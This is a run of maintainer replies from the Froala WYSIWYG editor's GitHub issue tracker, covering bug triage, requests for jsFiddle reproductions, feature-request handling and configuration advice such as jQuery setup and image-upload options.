@ncmancuso . Because of the way browsers work, it is not possible to compute the height of an element while it is hidden. Therefore, for the height of the iframe to be updated correctly, the editor should be visible.. The image event handlers are being triggered for images inserted via the editor UI and the image events are designed to be triggered for images inserted via the normal flow. I marked this as a feature request, so that we can discuss about it and see if it would be useful to add such an event for pasted images.. Thanks for the feature-request.. The htmlAllowedEmptyTags is designed to be used for tags which are not blockTags, e.g. p, h1, h2, etc.. Also, it doesn't allow a wildcard, and tags should be specified individually.. @zvermike Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. Thanks for the suggestion, @petester42. It is already in our plans to do that for larger plugins such as table and image. We're not keeping feature-requests here, therefore, I am marking it accordingly and closing it for now.. Unfortunately, for the preview, we cannot open it in a new tab as Javascript doesn't allow such a behavior. The target=\"_blank\" applies to the output, though.. Sure, the fr-fic tells the editor to align the image to center.  :). @steffenweber Unfortunately, this is a wontfix. The editor is designed to apply the format over to the selected text. If the OS selects the whitespace, then applying the format to that is the right way of doing it. \n. @ZIqbalconsultech it is not happening in the latest 2.8.1 version. Please make sure that you're using this version.. @jemunk Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. @jemunk while zero-width white-spaces might appear while in editing when getting the HTML from the editor by using the html.get method. They are being used in order to do exactly what the name of the option keepFormatOnDelete says - keeping the current format on delete. :). @Zaltek it appears to be a configuration problem on your side. Please reach us via https://www.froala.com/wysiwyg-editor/contact and our support team can assist you.. Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. If you want not to include specific CSS properties, you could use https://www.froala.com/wysiwyg-editor/docs/options#htmlIgnoreCSSProperties.. Thanks for the suggestion @giovanigenerali .. @azmatzuberi it looks like you have some custom code in there. We offer tech support via https://www.froala.com/wysiwyg-editor/contact.. This should be fixed on the current master.. @bpautsch the HTML markup you're seeing there is from the rangy lib. Froala Editor is not using it.. This is the way the selection works by default on MacOS. Same thing happens if you try to do that in the browser URL for instance.. @ShanmugaPriyanV please see: https://www.froala.com/blog/wysiwyg-editor/styling-emails-with-wysiwyg-html-editors.. @MikeMugu Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. It's already fixed on the current master repo.. Unfortunately, it is a bug from SpellChecker side. We already discussed with them and a fix will be provided by them in the upcoming weeks. . Duplicate of #2763.. @wonchoe could you please send us the steps to follow to reproduce this on our website?. I am closing this as we cannot reproduce it and we haven't got additional details.. @daviviano Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/. The image.uploaded event is triggered when the request got back from the server. The image.error event might still be triggered after this event in case the image fails to load.. It's fixed on the current master.. @dswitzer this should be fixed on the current master.. Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. Thanks for the details @kmckinless. We checked it further and the editor is designed to split SPAN tags and place links outside of them. This helps in properly maintaining the way colors and other font styles are set. Unfortunately, we won't make any changes to the current behavior.. We're doing it like this because in case we'd wrap the A tag with a span, you might end up selecting like red color and that wouldn't apply for links because you might have a CSS rule on the page which says that links should be blue.. Thanks for the feature-request, @jinq102030 .. @cygwin255 thanks for the feature-request. We don't have at this moment such a feature.. Looks like a problem from jsFiddle, not from us. \n\n. We don't set specific dates for a release, but we do them based on the features ready to be done and bugs which should be fixed. Most likely, it would be around the end of September.. @angelvazquezmenendez87 @Trapdafifou it looks like this is fixed now with the version 2.8.5. Do you think you could try again? Thanks.. @dgroh could you please check with the latest 2.8.4 version?. @bpautsch Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. Thanks for the details @bpautsch it is fixed on the current master.. Yes, there were some changes in the way we made the build. Let us check what is happening there.. @seb303 we just tested it and the saveParams appears to be sent correctly  - see the picture below. \nRegarding the response, we've started a more extending process of getting rid of jQuery and now all requests are made without jQuery, therefore, indeed the response is not converted to a hash, but it is the raw response. To convert it to a JSON, you could use JSON.parse(response).\n\n. @dgroh Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. I agree with you that maybe this should have been done in a release such as 2.9.0, however, at this moment it is too late to make such change because the release was already published on NPM and other places. It was a mistake on our side, we're learning from it, and next time will be better. \ud83d\ude4f \nThe data set to saveParams is sent in the body of the request. This is how the requests work for image, file and video from the very first version (and the same thing applies for the response). This last release just makes the saveParams consistent with the other params. I understand that this might break the behavior in your app, however, for now, the best approach would be to either keep using the version 2.8.1 or update to 2.8.3 and make some changes in your app. . Every time we do a release, we send an email with the changes to everyone who is subscribed to editor updates: https://www.froala.com/wysiwyg-editor/download#updates. Please make sure you are on the list so that you get such updates. \nAlso, we try to keep a full list of changes on the Changelog: https://www.froala.com/wysiwyg-editor/changelog. While it is not always possible to list there all the changes, the most important ones should be highlighted. \nThanks for all your feedback once again. It will for sure help us do better!. @seb303 at this moment we don't have other information anywhere than the places I already told you about. I agree with you that we should have explained these changes better, we're learning from this mistake and for sure will do it better in the future. . As far as we know, there shouldn\u2019t be any other events affected. I apologize again for the troubles it created.. @michaelryancaputo indeed there is a problem with that in the version 2.8.3. Could you please check with the current master and let us know if the problem is fixed? Basically, you should use the JS file from the current master instead of the one from the npm.. Are you calling the html.set method within your custom code?. @michaelryancaputo we've just put a release 2.8.4 which should fix this problem. Based on our tests there shouldn't be any more problems. It would be amazing if you could confirm that all is good on your side as well.. @ConnorsFan that is the correct behavior. The undo.saveStep method is designed to store a new snapshot in the undo stack only when the last snapshot is different.. As per my understanding, you are calling undo.saveStep before making any change in the editor after it is being loaded. Therefore, when you call the method in the editor there is already a first step which is exactly the first state of the loaded HTML. . Could you please open this issue on the Angular repo instead? Thanks.. @shinzenkoru at this moment we have only AWS S3 built-in integration. I marked this as a feature request for now.\nIn the meanwhile, I would recommend to upload images to your server and from there to the Digital Ocean Spaces.. We've just put together a public roadmap with the most popular features. \ud83d\ude0d There you can vote your favorite one, provide feedback or make new suggestions: https://wysiwyg-editor-roadmap.froala.com/public.. @sajjadkazemi10ss please contact us via the contact form for tech support https://www.froala.com/wysiwyg-editor/contact.. @szaib1986  Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. Closing this due to lack of response.. It's fixed on the current master.. @SagarKharche we couldn't reproduce it. Do you think you could make a recording?. I believe I am missing something. Could you please make a recording?. Closing this as it looks fine to me and haven't got any further details.. @chrisdeeming at this moment, the popups were not designed to have scrollable content inside them. They are designed to be helpers for the UX and we don't expect to have scroll inside there. Unfortunately, we won't add such a feature as it is against the UX constraints that we set there.. @tokarkry Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. Closing this due to lack of response from user.. We cannot reproduce this on the version 2.8.4. Could you please confirm that you're seeing this problem on our website?. Closing this due to lack of response from user.. @rgbweb When using the initOnClick option, the editor is fully initialized and has all the features available only after you focus on it. The entities are being escaped only after the editor was fully initialized because only after that moment it is possible to have input from the user. . Unfortunately, the browsers do not allow the best editing support for empty lines next to tables. At this moment, the behavior that is there in place is the best we can provide.. @tokarkry for this we have the line breaker tool which we'd suggest to use.\n\n. Unfortunately, this is the way the selection works in IE and there is not too much that we could do about it.. @bindea-mihai could you please open this issue in the angular repo (https://github.com/froala/angular-froala-wysiwyg)?. @me12722 it looks like you have some specific options changed in the default editor configuration. If you could create a jsFiddle where we can reproduce this, we would be happy to look into it. Without having a way to reproduce it, we cannot really do too much. \nDo you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. @me12722 we checked this again. I believe that you either changed the default editor options in a specific way or you are using an older version than 2.8.4.. Thanks for the improvements, @kaniansky .. @fflfi could you please make sure that you're using the latest 2.8.4 version. We cannot reproduce it here: https://jsfiddle.net/froala/wc5c3jhk/884/.. As a temporary workaround, please pass imageUploadURL: 'https://i.froala.com/upload?i=1 when uploading to S3.. @SeanKendle as an alternative approach you could also change the enter option: https://www.froala.com/wysiwyg-editor/examples/enter.. Thanks for the feature-request, @DaniyalZiaAwan .. We've just put together a public roadmap with the most popular features. \ud83d\ude0d There you can vote your favorite one, provide feedback or make new suggestions: https://wysiwyg-editor-roadmap.froala.com/public.. When the popup is open, we have to move focus to the input from the popup. Unfortunately, the browsers do not allow 2 different selection on the same page and we have to remove one of them.. When the editor is being initialized, a cleanup and some changes are made over to the HTML in order to provide a smooth editing experience. What we would recommend is to get the HTML value in the initialized event and compare the HTML you have with that one. Another approach could be to listen to the contentChanged event and see when it is triggered.. @HammadKhalil90 could you please send us the document you're pasting from?. @HammadKhalil90 are you experiencing this on our website as well?. Unfortunately, MS is doing some cleanup by its own and we don't have enough data in the clipboard in order to paste the image and formatting.. @HammadKhalil90 could you please send us the document you're pasting from?. @HammadKhalil90 Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. Thanks for all the details, @HammadKhalil90. We've investigated this problem and unfortunately, the HTML comes from MS Word already cleaned in this case and there is no way we could retrieve the formatting.. We are trying to keep the editor behavior similar to what other email clients / web apps do. This is the way email clients and Google Docs work, therefore at this moment we won't change this behavior.. In order to have the images use percent instead of pixels, you should use the following option: https://www.froala.com/wysiwyg-editor/docs/options#imageResizeWithPercent.. @steffenweber we're not really doing any special changes to the selection, but we let the browser behave the way it would normally do, therefore we cannot do too much on our side. Could you please open this issue on Chromebug instead?. We're using a contenteditable field underneath. Here is a jsFiddle which uses a simple contenteditable: https://jsfiddle.net/froala/wc5c3jhk/890/. Is the problem present only in the editor?. @steffenweber thanks for confirming. We'll have to check it especially on Linux to see what is happening there as we cannot see this problem on other OS. What Linux distribution are you using?. The code view is designed to be separate from all editor events. All changes made there are treated as an external change by the editor because it would be necessary to do some cleanup on them. I marked this as a feature-request for now.. Please see more details about why we don't trigger the contentChanged and other key events in the code view in the comment form here: https://github.com/froala/wysiwyg-editor/issues/1465#issuecomment-248594297.. We've just put together a public roadmap with the most popular features. \ud83d\ude0d There you can vote your favorite one, provide feedback or make new suggestions: https://wysiwyg-editor-roadmap.froala.com/public.. Duplicate of #2801 . @HereSinceres are you seeing this on a real device or only Chrome Simulator? Based on our experience, the Chrome Simulator doesn't replicate correctly the real device.. @HereSinceres could you please let us know what mobile device are you using?. We're going to review and try to fix in the release 2.8.7.. @demonspear please make sure you are using the latest 2.8.4 version.. @demonspear are you able to reproduce this on our website? . We've just checked this and it is more like a contenteditable problem and a restriction imposed by iOS, same happens in a blank contenteditable element: http://jsfiddle.net/froala/s0dkoyj4/. We're going to report it to Apple.. See https://github.com/froala/wysiwyg-editor/issues/1465#issuecomment-248594297.. @remofritzsche could you please make a jsFiddle for this? Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. That is because you're removing the editor instance without destroying it: https://jsfiddle.net/froala/byyo8mnd/697/.. That is because the height of the view is smaller than 500px and the editor is designed to keep the toolbar at the top when it exceeds the scrollable container. If you would set it to a value smaller than the height of the view all is good: https://jsfiddle.net/froala/ppyLhnqt/70/.. Thanks for the further details. Indeed, it appears to be a problem. I updated it accordingly.. Related to https://github.com/froala/wysiwyg-editor/issues/2981. . Yes, they are related because they use the same logic for positioning inside a scrollableContainer.. At this moment we don't have this feature, however, please make sure you subscribe to our newsletter to receive news as soon as it becomes available: https://www.froala.com/wysiwyg-editor/download#updates.. @mirazero could you please provide a video showing the problem and let us know what keys are you pressing on a QWERTY keyboard?. @skhydcos could you please let us know what keys are you pressing there on a QWERTY keyboard?\n@largeden do you think you could help us a little bit with steps to reproduce this? Thanks a million in advance! \ud83d\ude4f. Thanks for all the details, @largeden. We will be able to address this now.. Should be fixed on the current master.. You can always add new table style: https://www.froala.com/wysiwyg-editor/examples/table-cell-styles.. @fflfi it looks like you haven't updated the jsFiddle. Could you please check it?. It's good to hear that all is good now. . @rmmodi2 are you able to reproduce that on our website demo https://www.froala.com/wysiwyg-editor/examples/at-js? Could you also make a recording of the issue?. @rmmodi2 thanks for the details. It looks like this is a problem from At.JS, not from the editor.. The image paste feature was designed to prevent all images from being added over to the editor. I think you'd rather using for this https://www.froala.com/wysiwyg-editor/docs/options#imageUpload.. Closing this as a duplicate of #2807.. @Mboulianne if you'd like not to keep the word styles, then it is best to turn off the Word Paste plugin by not including it.. Indeed it appears to be an inconsistency there. We'll update the docs.. Thanks for the additional feedback, @Mboulianne. We're going to review it shortly.. The last commit is adding the wordPasteKeepFormatting where you can choose if to keep or not the formatting when pasting from Word and not displaying the model.. The htmlAllowedAttrs has by default data-.* inside the allowed attrs. This whitelists all the data attrs and this action is overriding the other one. The best thing to do would be to remove the data-.* from the default alloweda ttrs.. @petester42 we're not able to reproduce this. Do you think you could make a recording of this issue on our website demos?. @petester42 it looks like you're setting some style there on the editor elements which shouldn't be done. To set a max-height, the height options should be used: https://www.froala.com/wysiwyg-editor/examples/adjustable-height.. Yes, the editor is designed to scroll to the end of the pasted content.. Could you make a recording of this problem happening on our website without any CSS changes?. Thanks, Peter. However, I don't understand exactly what you're doing. Are you scrolling the editor to the top and then pasting some text?. The editor is not designed to store the cursor position when you're leaving the editing area. I am marking this as a feature-request for now.. @MaciekKuna we actually have an option for that: https://www.froala.com/wysiwyg-editor/docs/options#imageOutputSize.. Are you guys able to reproduce this on froala.com demo? What browser and OS are you using?. Is any of you experiencing this on https://www.froala.com/wysiwyg-editor? If not, maybe you could create a jsFiddle where it happens? Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. @sharmaprashant232 are you able to reproduce it on https://www.froala.com/wysiwyg-editor? Also, is this happening on a jsFiddle? https://jsfiddle.net/froala/wc5c3jhk/. Most likely this is an issue from your app - might be a CSS conflict or something similar. Please try checking the CSS rules in the browser developer console. Also, it might worth checking if there are other JS libs which might conflict with the editor.. Duplicate of #2719. @jsnick it looks like you have a newer region where the signature should be computed differently. We'll put some updates there in the docs for it.. The editor is designed to stop these events because if we wouldn't do so, then we'd end up losing focus from the editable area in many cases.. I added the feature-request flag on this for now and we'll consider adding it in a further release an event for toolbar click.. We do not keep feature-requests opened here. We use this repo only for bug tracking and enhancements.. @ckheder do you think you could create a jsFiddle?. Are you experiencing it in https://github.com/froala/wysiwyg-editor/blob/master/html/3rd-party/bootstrap/modal.html if you just download the archive from master?. It looks more like a conflict on setting up the editor in your app, rather than an issue with the editor itself. I would have to close this here and ask you to reach us for tech support via https://www.froala.com/wysiwyg-editor/contact.. Thanks for logging this, @ezebc182. We'll provide updates for it shortly.. @sachinkumaram-veoci do you still have this problem if you're using the iframe option?. https://www.froala.com/wysiwyg-editor/docs/options#iframe. Does it work if you're changing the editor zIndex option to a high value? https://www.froala.com/wysiwyg-editor/docs/options#zIndex. @sachinkumaram-veoci do you think could put together a repo with a simple Cordova app in which we can replicate this? Thanks in advance.. @sachinkumaram-veoci I just tried it and appears to work correctly for me. Any chance you could make a recording?. @sachinkumaram-veoci we are not able to reproduce it. Please find attached a recording.\ncordovaapp (1).zip\n. @sachinkumaram-veoci can you make a recording?. It doesn't appear to be any video attached. Could you please check?. @sachinkumaram-veoci I think you're sending it via email. You should upload it directly to Github in order to work correctly.. As per our investigation, it looks there is a problem with tabIndex CSS property on inputs in Cordova apps. As a workaround, we would suggest, the following approach: https://jsfiddle.net/froala/rds2p3f4/.\n. @kristian-puccio browser control inside contenteditable is quite limited in this case. We don't have too many options and what we did, is adding the possibility of clicking underneath the caption to create a new line after the image. . Please see a recording here.\nUntitled.mov.zip\n. Because of the way the browsers are handling the sliders, we cannot keep both video move and dragging the slider. Therefore, I would recommend disabling the videoMove option if you'd like to be able to move the slider by draf&drop. At this moment, it is possible to move it by click only with videoMove enabled.. At this moment jQuery should be defined globally in order to work correctly.. Yes, it is on our roadmap to remove jQuery as a dependency. In the meanwhile, jQuery should be defined globally. In Webpack, you could do it like this\njs\nimport $ from 'jquery';\nwindow.jQuery = $;\nwindow.$ = $;\nor add to the webpack config file\njs\nnew webpack.ProvidePlugin({\n  $: 'jquery',\n  jQuery: 'jquery'\n})\n. We don't think it's right to set expectations that may not be met due to shifting schedules. Therefore, we can't release any information about when this may be fixed for now.. We just reviewed this issue and it is more extensive than it looks initially. It would probably be addressed in release 2.9.0 or 2.10.0.. Minor releases will come in the following weeks. For major ones, we don't have a date to share yet.. The editor is wrapping the events over the jQuery triggerHandler method. When triggerHandler doesn't exist, then an error would be thrown. The events.trigger method is not designed to return a specific value because in case there are multiple events, there is no order between them. That is why, there is also the events.chainTrigger method (https://www.froala.com/wysiwyg-editor/docs/methods#events.chainTrigger) which returns the value as you're looking for.. @cbielich it looks like you might have some code there on the page which prevents the default editor behavior. Are you able to reproduce this on our website? If not, please reach us via https://www.froala.com/wysiwyg-editor/contact so that we can help you with tech support.. Thanks for bringing this to our attention. At this moment, we do not support fully pasting from OpenOffice. This is the way the browser is handling the pasting and it is on our list to add more support for pasting from OpenOffice.. Thanks for the feature request. I marked it accordingly and will close it for now as we don't keep feature requests here.. We have an internal system for tracking them. As soon as they are released, they will be included in the changelog.. No, features are prioritized by the number of requests. Only bugs are prioritized by license tier.. We're aware of some Grammarly problems and reported them over to Grammarly. Unfortunately, there is not too much we could do on our side, but push these further to Grammarly.\n. This should be fixed on the current master.. This looks more like a configuration problem, rather than an issue from the editor. By default, the editor has a loader while upload the images, which in this case doesn't show. Please reach us via https://www.froala.com/wysiwyg-editor/contact with more details on how we can reproduce it. . We're using this repo for bug tracking. For tech support please reach us via https://www.froala.com/wysiwyg-editor/contact.. Probably this would go better as an option, rather than something by default. I marked it as a feature-request for now.. @psoloninka do you think you could provide a recording as well? Thanks in advance.. Thanks for the details. I can confirm that it is an issue and the cause for it is the same with #2992.. The selection.save is adding some markers in the editor. It should never be used to add markers and leave the option of typing. . The cursor position can be changed using the selection.save method and restored with selection.restore. However, these actions should be done with no typing in between. It looks like you're looking for a special case and I would recommend reach our tech support via https://www.froala.com/wysiwyg-editor/contact for further guidance.. Please see https://jsfiddle.net/froala/pzt4adxb/46/ for a fix.. @gabra20 the insertLink, specialCharacters and insertImage buttons were designed to be used in the main toolbar and not in a popup. To use them in a popup, you should be changing the code used by the editor for those buttons.. Unfortunately, in IE 11, there are some problems with the way the browser renders the cursor. We've tried all kind of approaches for this and there is nothing we could find so far.. The editor is designed to output HTML5. What we'd suggest is to post-process the editor output and add the self-closing tags. \nThe unminified JS is available under the Professional / SaaS / Enterprise license.. The best way for removing the images would be just to send a request to the server telling that the image was removed from the editor but don't delete it. When the content of the editor is saved, together with that, the images which have been marked to be removed should be deleted as well.. The paragraph styles feature is designed to apply the style to the current paragraph, not the currently selected text. If you'd like to change it this way, it is best to create a custom plugin and use the format.apply, format.remove, and  format.toggle options.. The editor is designed to share the same toolbar as long as all the options are the same for both instances. It looks like certain options could be excluded, therefore I am marking this as a feature-request and enhancement as well.. @kikeso77 @kyashan do you think you could add this to https://wysiwyg-editor-roadmap.froala.com/public? Thank you.. We're playing with the idea of adding such a feature. It might come in a major editor version release, however, at this moment I don't have more details to share regarding this.. @cbielich are you able to reproduce this on our website as well? If so, could you please send a recording?. Closing this due to lack of response from the user.. Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. Sure, @jaimestuardo. The unminified JS is available to you under the Professional, SaaS and Enterprise licenses inside your account from froala.com.. At this moment, we do not support such a feature in the editor. I am marking this as a feature-request so that it is in our attention to be implemented in further versions.. Duplicate of https://github.com/froala/wysiwyg-editor/issues/2719.. Thanks for bringing this to our attention, @monsterlane. We consider this more like a feature-request, therefore I am marking it accordingly.  What I would recommend in case you have multiple instances in the meanwhile is to use the init on click configuration: https://www.froala.com/wysiwyg-editor/examples/init-on-click.. @monsterlane please send the code you might have on https://www.froala.com/wysiwyg-editor/contact. Thus we can redirect it to the right team. Thank you.. It's fixed on the current master branch from Github and will be included in the release 2.8.5.. @kristian-puccio do you think you could provide a recording?. Thanks for the recording. The htmlUntouched option is designed to allow the browser to do all the editing without changing the way the spaces or other elements are used. By default, the browser does not insert non-breaking spaces on delete and that is why instead of the fact that there are 2 spaces, it renders a single one. This is actually how the htmlUntouched option should work and we don't consider it a bug. . When pasting images from other websites, we are making them available for upload via a CORS proxy. Unfortunately, this doesn't work in all the cases because of the way websites are configured and there is not too much we could as far as we know.. @InciteGmbH are you able to reproduce this on our website as well?. Please see https://www.froala.com/wysiwyg-editor/docs/options#imageUploadRemoteUrls to disable the request to cors-anywhere.froala.com. . When pasting URLs which are from a different domain then that on which the editor is being used on, in order to allow reading the image and uploading it, it is necessary to use a CORS proxy. That is why the request is made over to https://cors-anywhere.froala.com. It looks like in your case, the request is somehow failing, but I am not sure why that happens. . The shortcut is not working because the button is not included in the toolbar. The shortcuts are designed to work only for the buttons included in the editor toolbar: https://jsfiddle.net/froala/cav6mu41/8/.. See: https://jsfiddle.net/froala/xyemc714/4/.. Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. Unfortunately, without having a jsFiddle to reproduce it, we cannot help too much. We would be really happy to look into this if you could reproduce it. Thank you in advance.. See https://jsfiddle.net/froala/anv1Lpkb/43/.. Thanks for reporting this. It is best to check with the guys from jQuery validate as it looks like they have some code in there which is being applied to all the elements on the page.. The undo.saveStep method should also be called: https://jsfiddle.net/froala/gw0xfzsb/42/.. It is a known problem in version 2.8.1. Please upgrade to 2.8.4. Thank you.. When the editor is initialized, the initial HTML is stored. When you click outside of the editor, it checks if there were any changes and if so, the contentChanged event is triggered. It looks like you're setting the HTML by using the html.set method. If you'd like to start over with everything inside the editor, the best way is to destroy the instance and initialize it again.. We have an internal method which should have worked, undo.reset. However, it looks like there is a problem with it. I am reopening this so that we can look into it again.. Indeed, that is related to #3013. This is the way the browser is handling spaces and we consider it as being the correct and intended purpose for htmlUntouched.. Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. It would be great if you could create a simple repo that we can clone and test the problem.. @EmanuelGenially see https://github.com/froala/wysiwyg-editor/issues/1465#issuecomment-248594297.. Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. Thanks for the details, @jerrywithaz. Unfortunately, this is how IE works in such cases and there is not too much that we could do from our side.. @philippeBchn do you think you could make a recording as well? Thanks in advance.. This should be fixed in version 2.8.5. If you still face this problem, it would worth trying to replicate it in a jsFiddle as there might be happening just in specific configurations: https://jsfiddle.net/froala/wc5c3jhk/.. Thanks for the feature-request..

Closing as duplicate of #3047. @YaroslavMolchan are you able to replicate this on our website?. @YaroslavMolchan unfortunately, without having a way to reproduce it we cannot do too much. We've tried replicating it on our side without success.. I am closing this as we don't have enough details to reproduce it. Would be happy to check it again once we get more details.. @atlcodecommandr do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. I am closing this as we couldn't reproduce it and we haven't got more details. Would be happy to look into it as soon as we get more details.. To use styles instead of classes, please disable the useClasses option.. @george-norris-salesforce see https://jsfiddle.net/froala/wc5c3jhk/1446/.. @ModernArtisan for the Embedly plugin to load correctly, please make sure that you include it from the third_party folder: \njs\n// Require Froala Editor Embedly js file.\nrequire('froala-editor/js/third_party/embedly.min.js');. In a web app, the content usually grows vertically. It is unlikely to add the same options for width..

Unfortunately, we cannot detect when the next / previous buttons are hit on iOS. This would remain a wontfix for now.. Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. Yes, it worked. That is why it is marked as enhancement. Thanks for checking.. Thanks for sending all the details @jakeplaras. Unfortunately, the lag comes from the browser pasting the content from the clipboard to the editor. There is not too much we could do from our side since this is the way the browser handles the large amount in the clipboard.. @ShanmugaPriyanV is there any way you could send us the HTML which was received in the email?. @ShanmugaPriyanV this is the HTML that is sent on the email?. I am closing this here as we have a conversation over the support channel regarding it.. @chrisdeeming which is the browser / OS that you're using? . We've tried this several times and we managed just a single time to reproduce it. Unfortunately, as it is so hard to have this happening, I am moving this for now to the wontfix category as the impact it has is not very high.. Same with https://github.com/froala/wysiwyg-editor/issues/2719. @altjx Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. @udaykirangoshika could you please provide details about how we can reproduce this issue?. I am closing this for now due to lack of response and would be happy to check it further if we get more details.. Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. Thanks for the feature request, @thedotedge. We don't keep feature-requests here, therefore I am closing it for now.. We've just put together a public roadmap with the most popular features. \ud83d\ude0d There you can vote your favorite one, provide feedback or make new suggestions: https://wysiwyg-editor-roadmap.froala.com/public.. As it works on a jsFiddle (https://jsfiddle.net/froala/wc5c3jhk/1538/), your problem most likely comes from a conflict with some JS or CSS from your app.. Sure, you can load Font Awesome they way you need. It doesn't matter as long as it is loaded.. Thanks for reporting it, @twgraham. The edit.off was designed to disable editing and it also removes the selection because there is some internal methods which require that. As it was not designed by default to work as this, I am marking this ticket as a feature-request to be considered.. @riafoxdev Could you please open this issue on the Angular repo instead? Also, it would be helpful if you could create a reproducible demo for it.. Thanks for sending this.. We'll update the docs to reflect that. This option was designed more for those apps where all links should be opened in a new tab. \nFor changing the checkbox to be checked by default, the best way would be to use the popups.show event (https://www.froala.com/wysiwyg-editor/docs/events#popups.show.[id]) and update the state there. While, we could easily add such an option, we don't want to add it unless there is more request because we'd grow the code base without a good reason.. On undo, the image.loaded is being triggered.. It's already on our list to do that: https://wysiwyg-editor-roadmap.froala.com/public/ideas/3547. Please make sure you upvote it.. We don't have any such problem. Could you please check if you have any plugins installed which might not allow it to work correctly?. https://github.com/froala/vue-froala-wysiwyg. Thanks for the suggestion on this. We don't merge PRs here specifically, though we addressed it via: https://github.com/froala/wysiwyg-editor/commit/9c6c2c141fbfa479c42bb954d4eac36519e110cc. Unfortunately, the browsers do not allow to open the links this way via JS.. @EmanuelGenially please use the keepFormatOnDelete option in order to keep the format.. We're aware of this problem and we're looking into alternatives way of disabling editing rather than using contenteditable=\"false\". Unfortunately, this is a browser rendering problem and until we come with the new way there is not too much we could do about it.. @DmitryVolkovTulaco could you please let us know the steps to reproduce it on https://www.froala.com/wysiwyg-editor/examples/embedly? Thanks.. Thanks for the details, Dmitry. We've checked it and unfortunately with the events that we get from Embedly that is the best we could do for syncing the editor height. I am marking this as wontfix for now and we would try to discuss with the Embedly team about it.. Thanks for reporting this. Unfortunately, on iOS we don't get the TAB key correctly from the keyboard and because of that, we cannot indent the list. As a workaround, we would suggest indenting list by using the toolbar indentation buttons.. At this moment we don't have an integration for NativeScript. However, please make sure that you request one on https://wysiwyg-editor-roadmap.froala.com/public.. @willhoyle we don't have such a feature at this moment. It would be great if you could put a request for it here: https://wysiwyg-editor-roadmap.froala.com..

Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. Thanks for reporting this. We just checked it and unfortunately, there is not too much we could do about it. When you start typing, the browser is automatically doing a reposition for the cursor thus the scroll... It looks like there is a problem with configuring the server. For tech support, please reach us via https://www.froala.com/wysiwyg-editor/contact. . Unfortunately, we cannot remove it in IE as it would break the way the editable area would work. . Unfortunately, in IE enter is not working correctly in certain cases if we don't have that ending BR. IE is behaving completely different and sometimes we have to use such dirty tricks.. The editor is designed to clear the inline formatting, such as bold, italic, etc.. It is not clearing the paragraph styles such as lists.. It is scheduled for the next release.. That is considered by the editor to be an empty state when you are using the ENTER_P mode. This is how it was actually designed in the first place.. That is because on paste, the editor is removing by default the styles and classes. However, you can control that through the pasteDeniedTags option: https://jsfiddle.net/froala/wc5c3jhk/1740/.. @trungntq for any questions regarding the Angular plugin, please open the issue directly there.. @angusgrant you're wrapping everything in a .fr-view class and that is why you get the editor style applied. Updated jsFiddle here: https://jsfiddle.net/froala/wc5c3jhk/1743/.\nScreenshot with the problem:\n\n. Unfortunately, we do not have an alternative for displaying the content. What I would recommend in this case is to use an empty DIV which has just that class and wrap the editor output with it.. All the editor content should be wrapped within an element with the fr-view class when it is being displayed: https://www.froala.com/wysiwyg-editor/docs/overview#frontend. Version 1 was working more as you need and that was creating a lot of troubles and this is how we end to have it set up like this. . Sure, there is a full discussion here: https://github.com/froala/wysiwyg-editor/issues/259. All comments are for V1, so please note that they might not apply on V2.. Thanks for opening this ticket @thiagopradi. At this moment, we don't have support for pasting from Apple Pages. I would recommend to open a feature request for that here: 